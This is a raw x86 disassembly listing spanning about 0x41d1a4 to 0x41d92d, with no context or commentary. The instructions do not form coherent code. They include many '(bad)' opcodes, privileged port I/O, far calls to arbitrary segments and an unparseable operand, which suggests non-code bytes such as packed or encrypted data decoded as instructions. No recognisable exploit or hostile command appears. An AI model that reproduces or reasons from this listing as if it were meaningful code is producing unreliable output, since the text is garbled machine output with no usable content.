  41d1a4:	jnp    0x41d169
  41d1a6:	jmp    0x41d193
  41d1a8:	stos   BYTE PTR es:[edi],al
  41d1a9:	aam    0xa3
  41d1ab:	lds    ebp,FWORD PTR [edi-0x2]
  41d1ae:	mov    cl,0xf8
  41d1b0:	cmp    edi,DWORD PTR [edx]
  41d1b2:	fwait
  41d1b3:	inc    dx
  41d1b5:	cmp    eax,DWORD PTR [edx]
  41d1b7:	ror    DWORD PTR [eax],1
  41d1b9:	stos   DWORD PTR es:[edi],eax
  41d1ba:	js     0x41d1b6
  41d1bc:	push   ecx
  41d1bd:	test   al,0x4b
  41d1bf:	mov    ecx,0x5e907d91
  41d1c4:	enter  0xe384,0xa3
  41d1c8:	in     al,dx
  41d1c9:	sbb    bl,BYTE PTR [esi-0x91e89b7]
  41d1cf:	hlt    
  41d1d0:	xchg   ecx,eax
  41d1d1:	adc    ebp,DWORD PTR [esi-0x4e]
  41d1d4:	fwait
  41d1d5:	test   DWORD PTR [esi-0x198b13c],ecx
  41d1db:	adc    dl,BYTE PTR [esi+0x4fe6b6de]
  41d1e1:	sahf   
  41d1e2:	popa   
  41d1e3:	popa   
  41d1e4:	out    0x1a,eax
  41d1e6:	nop
  41d1e7:	mov    al,0xa6
  41d1e9:	sub    ebp,DWORD PTR [ebx]
  41d1eb:	xor    esi,DWORD PTR ds:0xd34a6fff
  41d1f1:	call   0x7bda:0xe338c977
  41d1f8:	fwait
  41d1f9:	jg     0x41d199
  41d1fb:	in     al,dx
  41d1fc:	cdq    
  41d1fd:	pop    ss
  41d1fe:	add    DWORD PTR [ebx+0x54],ebx
  41d201:	sbb    ah,ch
  41d203:	jg     0x41d220
  41d205:	sub    BYTE PTR [edi-0x4633d04d],ah
  41d20b:	rcr    DWORD PTR [ebx-0xc9e24ee],cl
  41d211:	iret   
  41d212:	test   eax,0x8cdf1168
  41d217:	xor    ecx,0x456da37d
  41d21d:	push   ds
  41d21e:	cmp    eax,0x90b9716a
  41d223:	js     0x41d286
  41d225:	cmp    eax,0x30b8b0e9
  41d22a:	dec    ebp
  41d22b:	dec    edx
  41d22c:	(bad)  
  41d22d:	pop    ebx
  41d22e:	pop    esi
  41d22f:	ficomp WORD PTR [edi-0x67]
  41d232:	(bad)  
  41d233:	fs fwait
  41d235:	sub    esp,0x84320d4
  41d23b:	mov    bl,0x7b
  41d23d:	dec    edi
  41d23e:	xchg   DWORD PTR [edx+0x73],ecx
  41d241:	cmc    
  41d242:	adc    eax,0xd3d7432f
  41d247:	xchg   esp,eax
  41d248:	fwait
  41d249:	cmp    edi,0x5f3f4925
  41d24f:	stos   BYTE PTR es:[edi],al
  41d250:	jo     0x41d230
  41d252:	jnp    0x41d2cc
  41d254:	not    BYTE PTR [edi-0x2b4a42f3]
  41d25a:	nop
  41d25b:	fisttp QWORD PTR [edi]
  41d25d:	(bad)  
  41d25e:	(bad)  
  41d25f:	mov    DWORD PTR [ebp+0x12596592],edi
  41d265:	aam    0x59
  41d267:	jle    0x41d244
  41d269:	push   ss
  41d26a:	mov    edi,0x901fb923
  41d26f:	jno    0x41d29f
  41d271:	or     BYTE PTR [ebx],al
  41d273:	mov    ebp,ebp
  41d275:	imul   ecx,ebx,0x874b254c
  41d27b:	push   ecx
  41d27c:	mov    edi,0x60c010cb
  41d281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d282:	xchg   edx,eax
  41d283:	mov    DWORD PTR [ebx+eax*1+0x5e4a2577],ebp
  41d28a:	push   WORD PTR [ecx-0x5e]
  41d28e:	shl    BYTE PTR [ecx],0x35
  41d291:	fidiv  WORD PTR [edx]
  41d293:	push   edx
  41d294:	dec    ebp
  41d295:	inc    ebp
  41d297:	mov    dh,0x3b
  41d299:	dec    BYTE PTR [edi-0x1d71a171]
  41d29f:	hlt    
  41d2a0:	fsubp  st(7),st
  41d2a2:	pop    ds
  41d2a3:	dec    edx
  41d2a4:	rcr    bl,0x9e
  41d2a7:	push   esi
  41d2a8:	shl    DWORD PTR [eax+ebx*1+0x15dae15],cl
  41d2af:	mov    ch,0x9e
  41d2b1:	fnstcw WORD PTR [edi+0x98df21a]
  41d2b7:	cmp    BYTE PTR cs:[edx],bh
  41d2ba:	mov    esp,fs
  41d2bc:	sbb    DWORD PTR [eax-0x36],edx
  41d2bf:	dec    ecx
  41d2c0:	ret    
  41d2c1:	jecxz  0x41d2f2
  41d2c3:	stos   BYTE PTR es:[edi],al
  41d2c4:	out    0xe,eax
  41d2c6:	pop    ebx
  41d2c7:	lahf   
  41d2c8:	mov    al,ds:0xea1ae15
  41d2cd:	mov    dh,0x10
  41d2cf:	fist   WORD PTR [edi]
  41d2d1:	sub    DWORD PTR [esi+0x4a],0x9bbaf1be
  41d2d8:	shl    BYTE PTR [ebx+edx*4],cl
  41d2db:	pop    ecx
  41d2dc:	fwait
  41d2dd:	jecxz  0x41d267
  41d2df:	push   esi
  41d2e0:	inc    eax
  41d2e1:	out    dx,eax
  41d2e2:	loopne 0x41d279
  41d2e4:	xchg   ebp,eax
  41d2e5:	in     eax,0xa6
  41d2e7:	aam    0xb9
  41d2e9:	mov    ds:0xc0904a32,eax
  41d2ee:	adc    DWORD PTR [edi],ecx
  41d2f0:	fwait
  41d2f1:	pop    ds
  41d2f2:	jns    0x41d2fd
  41d2f4:	jae    0x41d2b0
  41d2f6:	and    al,0x0
  41d2f8:	rcr    ebp,0x5
  41d2fb:	out    0x8,al
  41d2fd:	xchg   ecx,eax
  41d2fe:	out    dx,eax
  41d2ff:	xchg   esp,eax
  41d300:	imul   eax,DWORD PTR [esi],0xedde9a90
  41d306:	xor    ebx,0x66a98a21
  41d30c:	pusha  
  41d30d:	adc    eax,0x40f40cdc
  41d312:	jae    0x41d314
  41d314:	sub    eax,DWORD PTR [ecx]
  41d316:	xor    al,0xd4
  41d318:	fwait
  41d319:	aam    0x53
  41d31b:	jg     0x41d2f2
  41d31d:	pop    esp
  41d31e:	lea    eax,[esi]
  41d320:	ret    0xe319
  41d323:	cmp    al,0x1b
  41d325:	mov    edx,0xa752806f
  41d32a:	sbb    BYTE PTR [edx],0x2b
  41d32d:	push   cs
  41d32e:	xchg   edx,eax
  41d32f:	inc    edi
  41d330:	call   0x2e9e:0x5a062ac1
  41d337:	push   ebx
  41d338:	mov    dh,0xde
  41d33a:	fs ins DWORD PTR es:[edi],dx
  41d33c:	jns    0x41d3aa
  41d33e:	test   DWORD PTR [esi-0x3545c20c],esi
  41d344:	fwait
  41d345:	je     0x41d31a
  41d347:	xor    eax,0xe2ee2ea8
  41d34c:	pop    ebx
  41d34d:	loop   0x41d340
  41d34f:	mov    ebx,0xcd368770
  41d354:	ins    DWORD PTR es:[edi],dx
  41d355:	ret    0x1b10
  41d358:	mov    ds:0x792a9016,eax
  41d35d:	ss daa 
  41d35f:	stos   DWORD PTR es:[edi],eax
  41d360:	outs   dx,DWORD PTR ds:[esi]
  41d361:	and    bl,ah
  41d363:	inc    edi
  41d364:	cmp    eax,0x654f83fc
  41d369:	fisub  WORD PTR [ecx-0x10]
  41d36c:	daa    
  41d36d:	add    eax,0x1c9b4741
  41d372:	in     eax,dx
  41d373:	dec    ebx
  41d374:	imul   edx,DWORD PTR [eax+ebp*1],0x3de8175
  41d37b:	add    bl,bl
  41d37d:	pop    ecx
  41d37e:	jmp    0x41d377
  41d380:	test   BYTE PTR [ebp-0x70],al
  41d383:	mov    ecx,0x3cd60029
  41d388:	aam    0x7c
  41d38a:	cmp    eax,DWORD PTR [ebp+0x1c9af082]
  41d390:	xchg   ecx,eax
  41d391:	mov    ebx,0x25336a90
  41d396:	xchg   edi,eax
  41d397:	imul   ebx,DWORD PTR [ebx-0x83b3ff1],0xffffffb3
  41d39e:	pop    ss
  41d39f:	jns    0x41d414
  41d3a1:	in     eax,0xb9
  41d3a3:	in     al,0xd5
  41d3a5:	xor    al,0xc4
  41d3a7:	dec    ecx
  41d3a8:	sbb    bh,BYTE PTR [edi]
  41d3aa:	in     al,0x59
  41d3ac:	fwait
  41d3ad:	and    eax,0x499e5caf
  41d3b2:	fwait
  41d3b3:	loop   0x41d337
  41d3b5:	fisubr WORD PTR [ebx-0x14861368]
  41d3bb:	or     BYTE PTR ds:0x284c81a,0x7d
  41d3c2:	(bad)  
  41d3c3:	loopne 0x41d36f
  41d3c5:	mov    ch,0x28
  41d3c7:	stos   BYTE PTR es:[edi],al
  41d3c8:	sbb    al,0x48
  41d3ca:	ret    0xf98d
  41d3cd:	fst    QWORD PTR [edi+eiz*1-0x6177885a]
  41d3d4:	sbb    cl,ah
  41d3d6:	(bad)  
  41d3d7:	lods   eax,DWORD PTR ds:[esi]
  41d3d8:	and    ah,BYTE PTR ds:0x9ed72cfd
  41d3de:	cld    
  41d3df:	dec    ecx
  41d3e0:	and    al,0x27
  41d3e2:	(bad)  
  41d3e4:	cs cmp cl,BYTE PTR ss:[edx-0x7cd53a5e]
  41d3ec:	adc    BYTE PTR [edx],al
  41d3ee:	(bad)  
  41d3ef:	hlt    
  41d3f0:	stos   DWORD PTR es:[edi],eax
  41d3f1:	dec    ecx
  41d3f2:	dec    esi
  41d3f3:	cmp    ch,BYTE PTR [edx+0x25972d17]
  41d3f9:	add    al,0xf1
  41d3fb:	pop    ebp
  41d3fc:	daa    
  41d3fd:	fisub  WORD PTR [eax]
  41d3ff:	outs   dx,DWORD PTR ds:[esi]
  41d400:	dec    eax
  41d401:	inc    esp
  41d402:	aaa    
  41d403:	les    edx,FWORD PTR ds:0x280690da
  41d409:	pop    es
  41d40a:	xor    BYTE PTR [ebp+0x30],0xca
  41d40e:	xor    al,0x4a
  41d410:	out    dx,eax
  41d411:	mov    al,0x92
  41d413:	test   eax,0x286b026
  41d418:	pushf  
  41d419:	mov    dh,0x65
  41d41b:	fs inc esi
  41d41d:	adc    ebp,DWORD PTR [eax]
  41d41f:	xlat   BYTE PTR ds:[ebx]
  41d420:	or     ebp,DWORD PTR [edi+0x1f4a49a9]
  41d426:	sub    eax,0x91ae80bc
  41d42b:	jg     0x41d3c8
  41d42d:	push   ebp
  41d42e:	outs   dx,DWORD PTR ds:[esi]
  41d42f:	inc    edx
  41d430:	add    BYTE PTR [edi+0xe],al
  41d433:	pop    eax
  41d434:	jl     0x41d415
  41d436:	out    0x42,eax
  41d438:	xor    ecx,ebx
  41d43a:	test   eax,0x4efe8337
  41d43f:	das    
  41d440:	fwait
  41d441:	cmp    DWORD PTR [edx],ecx
  41d443:	imul   ecx,DWORD PTR [edi-0x232e423],0x9ea9e07a
  41d44d:	push   ebp
  41d44e:	cmp    ecx,DWORD PTR [ebp-0x6a]
  41d451:	inc    esi
  41d452:	fs loope 0x41d440
  41d455:	jmp    0xec56:0xdde74dce
  41d45c:	punpcklbw mm4,DWORD PTR [ebx+0x7aa25039]
  41d463:	fs pushf 
  41d465:	into   
  41d466:	jnp    0x41d481
  41d468:	dec    esp
  41d469:	stc    
  41d46a:	xlat   BYTE PTR ds:[ebx]
  41d46b:	mov    esi,0x49afd5cb
  41d470:	xor    BYTE PTR [ecx],dl
  41d472:	fisttp DWORD PTR [edx-0xd]
  41d475:	pop    edi
  41d476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d477:	in     eax,0x9b
  41d479:	scas   al,BYTE PTR es:[edi]
  41d47a:	shl    DWORD PTR [ecx],0xa9
  41d47d:	gs loop 0x41d4cf
  41d480:	mov    cl,0x25
  41d482:	xchg   edx,eax
  41d483:	cmp    ch,BYTE PTR [edx+0x3b4f05c1]
  41d489:	xor    eax,0x821f9865
  41d48e:	jo     0x41d419
  41d490:	fwait
  41d491:	push   ebp
  41d492:	adc    cl,BYTE PTR [ecx]
  41d494:	sbb    al,0x46
  41d496:	ror    edi,1
  41d498:	or     bl,dh
  41d49a:	inc    edx
  41d49b:	popf   
  41d49c:	imul   esi,DWORD PTR [ebx-0x54],0xf
  41d4a0:	push   eax
  41d4a1:	lds    edx,FWORD PTR [eax+0x4eb1aa8]
  41d4a7:	iret   
  41d4a8:	inc    ecx
  41d4a9:	or     ecx,DWORD PTR [eax]
  41d4ab:	dec    edx
  41d4ac:	inc    ebp
  41d4ad:	lods   al,BYTE PTR ds:[esi]
  41d4ae:	mov    edx,0xc0e8df47
  41d4b3:	cld    
  41d4b4:	pushf  
  41d4b5:	(bad)
  41d4b8:	cmp    al,0x41
  41d4ba:	or     DWORD PTR [ecx+0xc],0xffffffcf
  41d4be:	test   DWORD PTR [edx-0x45299735],edi
  41d4c4:	mov    cl,0x53
  41d4c6:	fwait
  41d4c7:	dec    ecx
  41d4c8:	repnz push 0xffffffa7
  41d4cb:	dec    ebp
  41d4cc:	je     0x41d487
  41d4ce:	sbb    al,0xb9
  41d4d0:	mov    ecx,0x9bd410a2
  41d4d5:	cmc    
  41d4d6:	xchg   edi,eax
  41d4d7:	sub    edi,DWORD PTR [esi]
  41d4d9:	(bad)  
  41d4da:	(bad)  
  41d4db:	xor    al,0x78
  41d4dd:	and    al,BYTE PTR [edx-0x27c539f6]
  41d4e3:	pop    eax
  41d4e4:	pop    eax
  41d4e5:	push   edi
  41d4e6:	mov    DWORD PTR [eax],0xf4d7751b
  41d4ec:	lock xor edx,DWORD PTR [eax+0x6564bdb1]
  41d4f3:	inc    ecx
  41d4f4:	shr    BYTE PTR [ecx-0x7f],0x4a
  41d4f8:	add    BYTE PTR [ecx+0x1618208c],dl
  41d4fe:	xchg   ebp,eax
  41d4ff:	stc    
  41d500:	fwait
  41d501:	pop    eax
  41d502:	repz les edx,FWORD PTR [bx+di]
  41d506:	xchg   ecx,eax
  41d507:	jp     0x41d4ff
  41d509:	loopne 0x41d4ca
  41d50b:	xchg   edx,eax
  41d50c:	aas    
  41d50d:	sub    DWORD PTR [ecx],0x10e59b5c
  41d513:	mov    BYTE PTR [ecx-0x19492551],dl
  41d519:	fidiv  WORD PTR [eax+0x70]
  41d51c:	adc    dh,BYTE PTR ds:0xae40b7ee
  41d522:	dec    esi
  41d523:	dec    esp
  41d524:	fwait
  41d525:	outs   dx,BYTE PTR ds:[esi]
  41d526:	adc    eax,DWORD PTR [ecx]
  41d528:	or     eax,0x8029ea09
  41d52d:	fisub  WORD PTR [ebx*2-0x22abcf66]
  41d534:	pop    ds
  41d535:	mov    dl,BYTE PTR [eax-0x6372ea73]
  41d53b:	and    BYTE PTR [eax+0x774a0215],ah
  41d541:	inc    edi
  41d542:	jnp    0x41d586
  41d544:	jl     0x41d4ca
  41d546:	(bad)  
  41d547:	mov    eax,ds:0xf79ded9b
  41d54c:	in     eax,0x1e
  41d54e:	xchg   edi,eax
  41d54f:	add    dh,BYTE PTR [eax]
  41d551:	in     eax,dx
  41d552:	fiadd  WORD PTR [ebx]
  41d554:	xchg   esp,esi
  41d556:	cmp    BYTE PTR [edx],ah
  41d558:	and    cl,BYTE PTR [ebp-0x3d]
  41d55b:	pop    ecx
  41d55c:	in     al,0xbe
  41d55e:	mov    bl,0x44
  41d560:	mov    edx,0x9beaebd9
  41d565:	fist   DWORD PTR [esi-0xbf0fbfd]
  41d56b:	dec    ecx
  41d56c:	push   ds
  41d56d:	jnp    0x41d584
  41d56f:	sbb    DWORD PTR [edi+0x69],ebx
  41d572:	add    al,BYTE PTR [eax+0x27cd4e9f]
  41d578:	inc    edx
  41d579:	adc    BYTE PTR [edx+0x76],dl
  41d57c:	xchg   ecx,eax
  41d57d:	push   ebp
  41d57e:	jo     0x41d587
  41d580:	xor    BYTE PTR [eax+edx*4-0x64],0x3d
  41d585:	mov    ds:0xe6af7e9e,eax
  41d58a:	js     0x41d512
  41d58c:	inc    esp
  41d58d:	sub    al,0x36
  41d58f:	ja     0x41d589
  41d591:	fstp   QWORD PTR [ebx-0x32]
  41d594:	add    esp,DWORD PTR [ebx-0x27]
  41d597:	adc    DWORD PTR [ebx+0x2a048f76],ebx
  41d59d:	loope  0x41d550
  41d59f:	js     0x41d5fd
  41d5a1:	fidiv  WORD PTR [edx+0x6092dd1]
  41d5a7:	fcmovne st,st(3)
  41d5a9:	xchg   ecx,eax
  41d5aa:	nop
  41d5ab:	sahf   
  41d5ac:	mov    DWORD PTR cs:[edx],ebp
  41d5af:	jmp    0x41d5a9
  41d5b1:	jecxz  0x41d610
  41d5b3:	dec    ebx
  41d5b4:	sub    DWORD PTR [eax],0x48edb403
  41d5ba:	jmp    0x41d575
  41d5bc:	mov    ecx,0x684c9710
  41d5c1:	imul   edx,DWORD PTR [esi],0xfffffff2
  41d5c4:	sti    
  41d5c5:	xor    eax,0xde529b8c
  41d5ca:	ror    BYTE PTR [ebx+0x6bd3f1b8],1
  41d5d0:	xchg   ecx,eax
  41d5d2:	nop
  41d5d3:	pop    eax
  41d5d4:	jl     0x41d5e1
  41d5d6:	bnd jnp 0x41d61f
  41d5d9:	jp     0x41d581
  41d5db:	dec    ecx
  41d5dc:	gs mov ebx,0xfd22d391
  41d5e2:	jnp    0x41d5d3
  41d5e4:	fwait
  41d5e5:	enter  0xf919,0x5e
  41d5e9:	cwde   
  41d5ea:	adc    DWORD PTR [edi-0x41],eax
  41d5ed:	fld    QWORD PTR [ebx]
  41d5ef:	xor    eax,DWORD PTR [eax+0x2f241aa2]
  41d5f5:	dec    BYTE PTR [edi+0x4f97a15]
  41d5fb:	and    BYTE PTR [edi+0x7149a8d2],0x8a
  41d602:	sub    esp,DWORD PTR ds:0x1841d513
  41d608:	test   eax,0x48cbd2b
  41d60d:	pop    esi
  41d60e:	xor    eax,0x37dd7d2e
  41d613:	dec    edx
  41d614:	mov    eax,0xe1ec3440
  41d619:	gs aas 
  41d61b:	stos   DWORD PTR es:[edi],eax
  41d61c:	jecxz  0x41d5e5
  41d61e:	jns    0x41d689
  41d620:	push   0x9b722662
  41d625:	outs   dx,DWORD PTR ds:[esi]
  41d626:	inc    esi
  41d627:	aad    0xc9
  41d629:	stos   DWORD PTR es:[edi],eax
  41d62a:	mov    ah,0x49
  41d62c:	and    BYTE PTR [ebx+edi*2+0x36],0xc
  41d631:	dec    eax
  41d632:	sub    BYTE PTR [esi+0x45b86da2],al
  41d638:	and    dl,BYTE PTR [ebp-0x60]
  41d63b:	mov    ch,0x40
  41d63d:	sub    dl,BYTE PTR ds:0xfb02fb59
  41d643:	adc    DWORD PTR [ebx],ebx
  41d645:	cld    
  41d646:	mov    esp,0x90c1c4fb
  41d64b:	cs addr16 test al,0xf8
  41d64f:	push   esi
  41d650:	mov    ah,0xf2
  41d652:	dec    eax
  41d653:	pop    esp
  41d654:	(bad)  
  41d655:	xchg   DWORD PTR ds:0x1778224b,esi
  41d65b:	in     eax,0x2b
  41d65d:	mov    ds:0xfe9c318a,al
  41d662:	cmp    ah,cl
  41d664:	fimul  DWORD PTR [edx+0x738764a4]
  41d66a:	aaa    
  41d66b:	mov    edi,0x4f9be170
  41d670:	shr    bl,cl
  41d672:	shl    DWORD PTR [ebx],0xf
  41d675:	rcr    BYTE PTR [edi+0x770699dd],0x6d
  41d67c:	and    DWORD PTR [esi-0x68c4a737],ecx
  41d682:	call   0x2e94:0x48b0fb21
  41d689:	pop    esi
  41d68a:	nop
  41d68b:	dec    ebx
  41d68c:	ss xchg ecx,eax
  41d68e:	mov    esp,0x1813c5b4
  41d693:	xchg   edi,ebx
  41d695:	loopne 0x41d623
  41d697:	dec    edx
  41d698:	mov    ?,WORD PTR [ecx+0x56f4acf6]
  41d69e:	fcomp  DWORD PTR ss:[ebx+0x69ae17c5]
  41d6a5:	jnp    0x41d668
  41d6a7:	and    ah,al
  41d6a9:	fst    QWORD PTR [ecx]
  41d6ab:	jmp    0x41d65b
  41d6ad:	outs   dx,DWORD PTR ds:[esi]
  41d6ae:	sub    al,0xa9
  41d6b0:	call   0x7fbd6740
  41d6b5:	das    
  41d6b6:	pop    edx
  41d6b7:	adc    ebp,DWORD PTR [eax]
  41d6b9:	loopne 0x41d6f0
  41d6bb:	dec    esp
  41d6bc:	call   0x70d7:0xdd7f5eaf
  41d6c3:	pop    edi
  41d6c4:	mov    bl,0x80
  41d6c6:	nop
  41d6c7:	or     eax,0xd9667e75
  41d6cc:	cmc    
  41d6cd:	cmp    ecx,ecx
  41d6cf:	push   eax
  41d6d0:	lahf   
  41d6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d2:	dec    ebp
  41d6d3:	mov    esi,esp
  41d6d5:	and    dh,BYTE PTR [eax+0xc]
  41d6d8:	push   0x6caa5066
  41d6dd:	ret    
  41d6de:	nop
  41d6df:	loopne 0x41d68e
  41d6e1:	jbe    0x41d73b
  41d6e3:	xlat   BYTE PTR ds:[ebx]
  41d6e4:	das    
  41d6e5:	addr16 pop edi
  41d6e7:	pop    eax
  41d6e8:	ins    DWORD PTR es:[edi],dx
  41d6e9:	fild   WORD PTR ss:[ebp-0x65]
  41d6ed:	sbb    BYTE PTR [edx],dh
  41d6ef:	iret   
  41d6f0:	dec    ebp
  41d6f1:	icebp  
  41d6f2:	(bad)  
  41d6f3:	ja     0x41d772
  41d6f5:	ins    BYTE PTR es:[edi],dx
  41d6f6:	daa    
  41d6f7:	pushf  
  41d6f8:	nop
  41d6f9:	sahf   
  41d6fa:	jecxz  0x41d691
  41d6fc:	push   DWORD PTR ds:0x184aefd0
  41d702:	fisub  DWORD PTR [edx+edi*4-0x6437fec1]
  41d709:	ins    BYTE PTR es:[edi],dx
  41d70a:	or     DWORD PTR [ebp+0x3b],0xffffffcd
  41d70e:	stos   BYTE PTR es:[edi],al
  41d70f:	sbb    esp,edx
  41d711:	jp     0x41d78e
  41d713:	dec    edx
  41d714:	mov    ebx,0x765aabb5
  41d719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d71a:	sbb    al,0x4a
  41d71c:	rcl    BYTE PTR [ebx+eiz*4-0x27],0x70
  41d721:	dec    eax
  41d722:	sbb    BYTE PTR [ebp+0x1a43bf9b],0xfc
  41d729:	jl     0x41d768
  41d72b:	call   0xd7d6:0x7c0bdde3
  41d732:	stos   BYTE PTR es:[edi],al
  41d733:	enter  0xa588,0xd
  41d737:	mov    BYTE PTR [ebx+0x711c3053],bl
  41d73d:	or     al,0x1d
  41d73f:	mov    esi,DWORD PTR [edx-0x22]
  41d742:	cmp    ebx,DWORD PTR [ebx+0x69048316]
  41d748:	(bad)  
  41d749:	cmp    al,0xad
  41d74b:	sahf   
  41d74c:	das    
  41d74d:	ret    0x73d1
  41d750:	dec    esi
  41d751:	sub    BYTE PTR [ebx-0x23694b5],cl
  41d757:	dec    ecx
  41d758:	std    
  41d759:	push   es
  41d75a:	aam    0xcf
  41d75c:	pop    ecx
  41d75d:	outs   dx,BYTE PTR ds:[esi]
  41d75e:	mov    fs,WORD PTR [esp+ebx*4-0x7d]
  41d762:	xor    DWORD PTR [esi-0x7ad790e4],esp
  41d768:	xchg   ebx,eax
  41d769:	aaa    
  41d76a:	cmp    DWORD PTR [edx-0x4a],ecx
  41d76d:	xchg   ecx,eax
  41d76e:	pop    edi
  41d76f:	cmc    
  41d770:	dec    esp
  41d771:	loop   0x41d711
  41d773:	dec    eax
  41d774:	popf   
  41d775:	mov    DWORD PTR [ebp-0x57],0xaa74a163
  41d77c:	ret    0xb5df
  41d77f:	pop    eax
  41d780:	cmp    esi,DWORD PTR [esi-0x2723e5b8]
  41d786:	mov    ah,0xb3
  41d788:	sub    BYTE PTR [esi+0x7b9b460d],ch
  41d78e:	in     al,0x77
  41d790:	fistp  QWORD PTR [ebx+eax*4+0x77dd9cee]
  41d797:	(bad)  
  41d798:	cmp    BYTE PTR [esi+0x5c8b7b85],ah
  41d79e:	nop
  41d79f:	or     DWORD PTR [ebx-0x23],esi
  41d7a2:	mov    BYTE PTR [edx],al
  41d7a4:	rep ins BYTE PTR es:[edi],dx
  41d7a6:	lock dec ecx
  41d7a8:	inc    ecx
  41d7a9:	pusha  
  41d7aa:	mov    eax,0x636ac63d
  41d7af:	or     ebx,DWORD PTR [ebx+0x1f246918]
  41d7b5:	sub    BYTE PTR [edx+0x67],cl
  41d7b8:	jl     0x41d811
  41d7ba:	cmp    eax,0x63f2044a
  41d7bf:	mov    bh,BYTE PTR [ebx]
  41d7c1:	xor    esp,DWORD PTR [ebx-0x1f]
  41d7c4:	stos   BYTE PTR es:[edi],al
  41d7c5:	pop    edi
  41d7c6:	push   ebp
  41d7c7:	inc    ebp
  41d7c8:	pop    eax
  41d7c9:	fisub  WORD PTR ds:0x9e129ff5
  41d7cf:	dec    ecx
  41d7d0:	adc    eax,0xa0732d53
  41d7d5:	xbegin 0x909af094
  41d7db:	fdiv   DWORD PTR [ebp+0x5b]
  41d7de:	mov    BYTE PTR [ebp-0x43],bh
  41d7e1:	adc    esp,DWORD PTR [ecx]
  41d7e3:	dec    edx
  41d7e4:	xchg   ebp,eax
  41d7e5:	out    0x43,al
  41d7e7:	or     cl,ah
  41d7e9:	and    al,BYTE PTR [ecx-0x4f69647d]
  41d7ef:	jle    0x41d7e4
  41d7f1:	or     al,0x94
  41d7f3:	scas   eax,DWORD PTR es:[edi]
  41d7f4:	mov    esp,0xae4b8d53
  41d7f9:	lea    esp,[edi-0x231b8728]
  41d7ff:	inc    eax
  41d800:	inc    ebx
  41d801:	sub    dl,ah
  41d803:	loopne 0x41d7a0
  41d805:	rol    BYTE PTR [esi-0x3ee8e10],1
  41d80b:	xor    BYTE PTR [ecx-0x5],dl
  41d80e:	dec    edx
  41d80f:	pop    eax
  41d810:	jns    0x41d830
  41d812:	sub    eax,0xd1a27688
  41d817:	in     eax,0x9f
  41d819:	adc    edi,ebx
  41d81b:	cmp    DWORD PTR [eax-0x1dbfefe3],esp
  41d821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d822:	lock dec ecx
  41d824:	push   ebp
  41d825:	loop   0x41d85c
  41d827:	xchg   edx,eax
  41d828:	adc    ah,BYTE PTR [eax+0x1d8d6e2b]
  41d82e:	nop
  41d82f:	shr    BYTE PTR [ecx+0x4882e2ef],1
  41d835:	pop    ecx
  41d836:	push   eax
  41d837:	dec    edx
  41d838:	ret    0x2acb
  41d83b:	sub    DWORD PTR [edx+0x7f918b0c],edi
  41d841:	lods   al,BYTE PTR ds:[esi]
  41d842:	nop
  41d843:	mov    esi,0xfcef656c
  41d848:	or     DWORD PTR [ecx-0x72],ebx
  41d84b:	xchg   DWORD PTR [eax+0x16],eax
  41d84e:	nop
  41d84f:	jbe    0x41d7f6
  41d851:	ss sub esp,edx
  41d854:	rol    BYTE PTR [eax-0x6f],cl
  41d857:	sar    edi,0x33
  41d85a:	pop    ecx
  41d85b:	inc    edx
  41d85c:	dec    esi
  41d85d:	into   
  41d85e:	ins    BYTE PTR es:[edi],dx
  41d85f:	adc    ax,0xb5fb
  41d863:	mov    ds:0x7fee1e3e,al
  41d868:	and    eax,0x9bebca1d
  41d86d:	retf   
  41d86e:	mov    dl,0x4c
  41d870:	mov    eax,0x1e3d477c
  41d875:	in     eax,dx
  41d876:	lock or al,0xbc
  41d879:	cmp    BYTE PTR [ecx-0x685e3081],dh
  41d87f:	sbb    eax,edi
  41d881:	ins    DWORD PTR es:[edi],dx
  41d882:	nop
  41d883:	repz sbb bh,ch
  41d886:	jo     0x41d8c3
  41d888:	stos   BYTE PTR es:[edi],al
  41d889:	mov    dl,0xd5
  41d88b:	dec    ecx
  41d88c:	or     al,0x16
  41d88e:	xor    bl,al
  41d890:	imul   ebp,DWORD PTR cs:[edx-0x5f],0xe632d39e
  41d898:	and    ebx,DWORD PTR [ecx+0x4f1701d0]
  41d89e:	cwde   
  41d89f:	dec    ecx
  41d8a0:	hlt    
  41d8a1:	fs push edx
  41d8a3:	(bad)  
  41d8a4:	std    
  41d8a5:	mov    ecx,0x69a910b7
  41d8aa:	push   eax
  41d8ab:	and    BYTE PTR [ebp+0x1b94dd81],bl
  41d8b1:	jb     0x41d92a
  41d8b3:	xchg   DWORD PTR [edi],eax
  41d8b5:	(bad)  
  41d8b7:	and    DWORD PTR [edx-0x5691cd3a],edx
  41d8bd:	xchg   BYTE PTR [eax-0x7235e63e],dl
  41d8c3:	mov    cs:0x6d79d520,al
  41d8c9:	pop    eax
  41d8ca:	jl     0x41d8ff
  41d8cc:	cmp    ch,BYTE PTR [edi-0x70]
  41d8cf:	and    edx,esi
  41d8d1:	xor    eax,edi
  41d8d3:	and    BYTE PTR [edi+0x74],0x64
  41d8d7:	inc    esi
  41d8d8:	int    0xde
  41d8da:	jno    0x41d8a3
  41d8dc:	push   ss
  41d8dd:	mov    ds:0x9da2f996,eax
  41d8e2:	inc    ebx
  41d8e3:	loop   0x41d89e
  41d8e5:	inc    esp
  41d8e6:	and    cl,BYTE PTR [eax+0x5b]
  41d8e9:	(bad)  
  41d8ea:	rol    DWORD PTR [ecx-0x3e9ebc3e],1
  41d8f0:	leave  
  41d8f1:	pop    ss
  41d8f2:	inc    esp
  41d8f3:	pop    es
  41d8f4:	fwait
  41d8f5:	mov    ch,0x3f
  41d8f7:	pop    ss
  41d8f8:	mov    cl,0x90
  41d8fa:	daa    
  41d8fb:	add    eax,0x35fa2daa
  41d900:	imul   ebx,DWORD PTR [edx-0x513aecaf],0xbd8f03e6
  41d90a:	repnz push esp
  41d90c:	jg     0x41d89c
  41d90e:	outs   dx,BYTE PTR ds:[esi]
  41d90f:	cmp    BYTE PTR [ebx+0x2538dd68],bl
  41d915:	dec    edx
  41d916:	lahf   
  41d917:	sub    esp,ebx
  41d919:	and    BYTE PTR [eax],0xa7
  41d91c:	mov    DWORD PTR [esi-0x70],ecx
  41d91f:	mov    BYTE PTR [edx],bh
  41d921:	out    dx,eax
  41d922:	cmp    cl,BYTE PTR [ecx-0x47]
  41d925:	fnsave [esi+eax*1+0x74]
  41d929:	(bad)  
  41d92b:	mov    dh,0xba
  41d92d:	ds nop
